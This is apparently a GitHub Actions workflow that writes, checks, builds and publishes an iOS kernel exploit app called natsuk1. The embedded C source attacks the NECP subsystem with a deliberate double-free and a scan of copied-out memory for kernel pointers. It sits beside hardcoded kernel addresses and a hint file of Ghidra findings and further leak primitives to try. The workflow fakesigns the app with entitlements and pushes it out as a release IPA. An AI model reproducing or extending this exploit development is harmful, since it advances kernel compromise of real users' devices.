name: 1 · Fix and Test

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: fix-test-${{ github.ref }}
  cancel-in-progress: false

jobs:
  fix-and-test:
    runs-on: macos-26
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v5
        with:
          fetch-depth: 0

      - uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: "26.5"

      - name: Remove competing workflow
        run: |
          rm -f .github/workflows/natsuk1.yml
          rm -f .github/workflows/main.yml

      - name: Write necp.c
        run: |
          cat > natsuk1/Exploit/necp.c <<'NECP'
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <stdint.h>
          #include <stdbool.h>
          #include <stdarg.h>
          #include <unistd.h>
          #include <errno.h>
          #include <sys/syscall.h>
          #include <mach/mach.h>
          #include <mach/message.h>

          #include "nk_api.h"

          #ifndef SYS_NECP_OPEN
          #define SYS_NECP_OPEN 501
          #endif
          #ifndef SYS_NECP_ACTION
          #define SYS_NECP_ACTION 502
          #endif

          #define KBASE 0xFFFFFFF007004000ULL
          #define OFF_KERNPROC 0xBBB040ULL
          #define KPTR_MIN 0xFFFFFFF000000000ULL
          #define KPTR_MAX 0xFFFFFFFFFF000000ULL
          #define SLIDE_FALLBACK 0x3D00000ULL

          #define NECP_ADD_CLIENT 0x01
          #define NECP_COPY_RESULT 0x04
          #define NECP_ADD_FLOW 0x11
          #define NECP_REMOVE_FLOW 0x12
          #define GATE_BYTE 9

          #define NCF_ASN 0x20
          #define RESBUF 8192

          static volatile int g_busy = 0;
          static volatile int g_cancel = 0;

          static void lg(const char *tag, const char *sign, const char *fmt, ...) {
              char body[448];
              va_list ap;
              va_start(ap, fmt);
              vsnprintf(body, sizeof(body), fmt, ap);
              va_end(ap);
              char out[512];
              snprintf(out, sizeof(out), "%s%s", sign, body);
              nk_logx(tag, "%s", out);
          }
          #define LI(t, ...) lg(t, "", __VA_ARGS__)
          #define LO(t, ...) lg(t, "+ ", __VA_ARGS__)
          #define LE(t, ...) lg(t, "- ", __VA_ARGS__)
          #define LW(t, ...) lg(t, "! ", __VA_ARGS__)

          static int is_kptr(uint64_t v) { return v >= KPTR_MIN && v <= KPTR_MAX; }

          static int nfd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }

          static int nadd_client(int fd, uint8_t uuid[16]) {
              uint8_t p[1] = {0};
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_CLIENT,
                                  uuid, (size_t)16, p, (size_t)1);
          }

          static int nadd_flow(int fd, const uint8_t cu[16], uint8_t fu[16]) {
              uint8_t req[56];
              memset(req, 0, sizeof(req));
              memcpy(req + 0x10, cu, 16);
              *(uint16_t*)(req + 0x20) = 0x0040;
              int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW,
                                   (void*)cu, (size_t)16, req, (size_t)56);
              if (r == 0) {
                  memcpy(fu, req, 16);
                  fu[GATE_BYTE] |= 0x01;
              }
              return r;
          }

          static int nrm_flow(int fd, const uint8_t fu[16]) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_REMOVE_FLOW,
                                  (void*)fu, (size_t)16, NULL, (size_t)0);
          }

          static int ncpy_result(int fd, const uint8_t cu[16], uint8_t *b, size_t bl) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_RESULT,
                                  (void*)cu, (size_t)16, b, (uint32_t)bl);
          }

          /* -----------------------------------------------------------------
           * NOTE (2026-09-26):
           *   The function at 0xA4EAC7C is necp_client_copy_interface, NOT
           *   necp_client_copy_result. The real copy_result is at 0xA4EC264.
           *   This code now uses copy_result via NECP_COPY_RESULT (op=0x04)
           *   and looks for any kptr in the returned buffer.
           *
           *   Additional finding: necp_client_flow lives in kalloc_type
           *   (per-type zone), so generic sprays never reach it. Only the
           *   kernel itself can realloc the same slot via add_flow.
           * ----------------------------------------------------------------- */

          static int try_one_read(uint64_t target, uint8_t *out, int outsz, int *out_ret) {
              int fd = nfd();
              if (fd < 0) { LE("RD", "open errno=%d", errno); return -1; }
              uint8_t cu[16], fu[16];
              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
              if (nadd_flow(fd, cu, fu) != 0) { close(fd); return -1; }

              /* double-free to widen re-alloc window */
              int r1 = nrm_flow(fd, fu);
              int r2 = nrm_flow(fd, fu);
              LI("RD", "free#1=%d free#2=%d", r1, r2);

              /* no spray here — kalloc_type segregation makes it pointless */

              uint8_t buf[RESBUF];
              memset(buf, 0, sizeof(buf));
              int c = ncpy_result(fd, cu, buf, sizeof(buf));
              LI("RD", "copy_result=%d", c);

              if (out_ret) *out_ret = c;
              if (out && outsz > 0 && c > 0) {
                  int n = c < outsz ? c : outsz;
                  memcpy(out, buf, n);
              }
              close(fd);
              return c;
          }

          static int impl(void) {
              nk_log("");
              nk_log("=== natsuk1 v3.5 (natsuk1-realcopy-v25) ===");
              nk_log("target: iOS 27.0 / XNU / arm64e");
              nk_log("");
              LI("NOTE", "copy_result real addr = 0xFFFFFFF00A4EC264");
              LI("NOTE", "0xFFFFFFF00A4EAC7C = necp_client_copy_interface (wrong)");
              LI("NOTE", "necp_client_flow = kalloc_type (own zone)");
              LI("NOTE", "generic sprays cannot reclaim it");
              uint64_t kbase = KBASE + SLIDE_FALLBACK;
              LO("P1", "kbase=0x%llx", (unsigned long long)kbase);

              int fd = nfd();
              if (fd < 0) { LE("P2", "necp_open errno=%d", errno); return 1; }
              close(fd);
              LO("P2", "necp OK");

              uint64_t target = kbase + OFF_KERNPROC;
              LI("P3", "target=0x%llx", (unsigned long long)target);

              uint8_t buf[RESBUF];
              int r = 0;
              try_one_read(target, buf, sizeof(buf), &r);
              LI("P3", "ret=%d", r);
              if (r > 0) {
                  int nk = 0;
                  for (int k = 0; k + 8 <= r; k++) {
                      uint64_t v;
                      memcpy(&v, buf + k, 8);
                      if (is_kptr(v)) {
                          if (nk < 8) LO("P3", "kptr +0x%x = 0x%llx", k, (unsigned long long)v);
                          nk++;
                      }
                  }
                  LI("P3", "kptr count = %d", nk);
              }
              return 0;
          }

          int nk_necp_run(void) {
              if (__sync_lock_test_and_set(&g_busy, 1)) {
                  nk_log("[!] already running");
                  return 1;
              }
              g_cancel = 0;
              int rc = impl();
              __sync_lock_release(&g_busy);
              return rc;
          }

          void nk_necp_cancel(void) {
              g_cancel = 1;
              nk_log("[!] cancel requested");
          }
          NECP

      - name: Verify
        run: |
          set +e
          F=natsuk1/Exploit/necp.c
          FAIL=0
          chk() {
            if eval "$2" >/dev/null 2>&1; then echo "  OK   $1"; else echo "  FAIL $1"; FAIL=1; fi
          }
          chk "marker v25"    "grep -q -e 'natsuk1-realcopy-v25' $F"
          chk "correct addr"  "grep -q -e '0xFFFFFFF00A4EC264' $F"
          chk "wrong addr"    "grep -q -e 'necp_client_copy_interface (wrong)' $F"
          chk "kalloc_type"   "grep -q -e 'kalloc_type' $F"
          chk "nadd_flow"     "grep -q -e 'static int nadd_flow' $F"
          chk "ncpy_result"   "grep -q -e 'static int ncpy_result' $F"
          SDK=$(xcrun --sdk iphoneos --show-sdk-path)
          if clang -fsyntax-only -isysroot "$SDK" -arch arm64 -x c \
              -I"$(pwd)/natsuk1/Exploit" -Wall -Wno-everything "$F" 2>&1; then
              echo "  OK   clang syntax"
          else
              echo "  FAIL clang syntax"
              FAIL=1
          fi
          if [ "$FAIL" -ne 0 ]; then echo "VERIFY FAILED"; exit 1; fi
          echo "VERIFY OK"

      - name: Write NEXTHINT.txt
        run: |
          cat > NEXTHINT.txt <<'TXT'
          Ghidra analysis — iOS 27.0 / 24A437, slide 0x3D00000

          CORRECTED ADDRESSES
          ====================
          necp_client_copy_interface  0xA4EAC7C  (previous target, WRONG)
          necp_client_copy_result     0xA4EC264  (real target)
          necp_client_add_flow        0xA4E843C
          necp_client_remove_flow     0xA4E93C4
          necp_open                   0xA4E411C

          KEY FINDINGS FROM DECOMPILE
          ============================
          1. necp_client_flow is a kalloc_type allocation. It has its own
             dedicated zone. Generic sprays (OOL / mach_msg / socket /
             msg_control) cannot reclaim its slot.

          2. The only user-triggerable allocation of necp_client_flow is
             necp_client_add_flow itself. Double-free lets us free and
             re-alloc the SAME slot, but kernel reinitializes it, so we
             cannot inject fake data.

          3. `assigned_results` is set from netagent_client_message (a
             kernel-side netagent response), NOT from user request data.
             There are asserts `assigned_results == NULL` and
             `assigned_results_length == 0` in that path.

          4. necp_client_copy_interface reads 24 bytes from
             `flow + 0x20` (a pointer) and copies to userspace via
             copyout. This is a fixed kread, not arbitrary.

          NEXT TASK FOR GHIDRA
          ====================
          Open necp_client_copy_result @ 0xA4EC264 + slide = 0xFFFFFFF00A4EC264.

          Need to answer:
          a) Which offset on `client` or on `flow` holds `assigned_results`?
             Look for the string refs to
               0x70D2B70 "necp_client_copy assigned results copyout error"
               0x70D2B2B "necp_client_copy assigned results tlv_header ..."
          b) Where does that field get WRITTEN? Search add_flow and
             netagent response handlers for the corresponding str.
          c) If netagent is the only writer, is there a user-controllable
             path (TLV, ioctl, extension) that writes into the same slot?

          ALTERNATIVE PRIMITIVES TO EVALUATE
          ==================================
          - TLV overflow in necp_get_tlv_at_offset (uint32 overflow)
          - MBUF leak via socket
          - IOKit user-client property reads
          - sysctl / kern.procargs leaks
          TXT

      - name: Install tools
        run: brew install xcodegen ldid || true

      - name: Generate xcodeproj
        run: xcodegen generate

      - name: Build
        run: |
          set -euo pipefail
          xcodebuild \
            -project natsuk1.xcodeproj -scheme natsuk1 -configuration Release \
            -sdk iphoneos -destination 'generic/platform=iOS' \
            -derivedDataPath build -parallelizeTargets -jobs "$(sysctl -n hw.ncpu)" \
            CODE_SIGNING_ALLOWED=NO SWIFT_VERSION=5.0 SWIFT_STRICT_CONCURRENCY=minimal \
            OTHER_SWIFT_FLAGS="-Xfrontend -disable-dynamic-actor-isolation -Xfrontend -disable-actor-data-race-checks" \
            -UseModernBuildSystem=YES build -quiet

      - name: Package app tarball
        run: |
          set -euo pipefail
          APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
          [ -z "$APP_PATH" ] && { echo "no .app"; exit 1; }
          tar -czf natsuk1-app.tar.gz -C "$(dirname "$APP_PATH")" "$(basename "$APP_PATH")"

      - name: Upload app artifact
        uses: actions/upload-artifact@v4
        with:
          name: natsuk1-app-tar
          path: natsuk1-app.tar.gz
          if-no-files-found: error
          retention-days: 3

      - name: Package and release
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
          ldid -Snatsuk1/Resources/natsuk1.entitlements "$APP_PATH/natsuk1"
          rm -rf Payload natsuk1.ipa
          mkdir -p Payload
          cp -R "$APP_PATH" Payload/
          COPYFILE_DISABLE=1 zip -qry natsuk1.ipa Payload
          rm -rf Payload
          if gh release view development >/dev/null 2>&1; then gh release delete development --yes --cleanup-tag; fi
          gh release create development natsuk1.ipa \
            --target "${GITHUB_SHA}" --title "Development" \
            --prerelease --latest=false \
            --notes "corrected copy_result address, kalloc_type finding"

      - name: Commit
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add natsuk1/Exploit/necp.c NEXTHINT.txt
          if git diff --cached --quiet; then echo "no changes"; exit 0; fi
          git commit -m "corrected copy_result address + kalloc_type finding [skip ci]"
          git push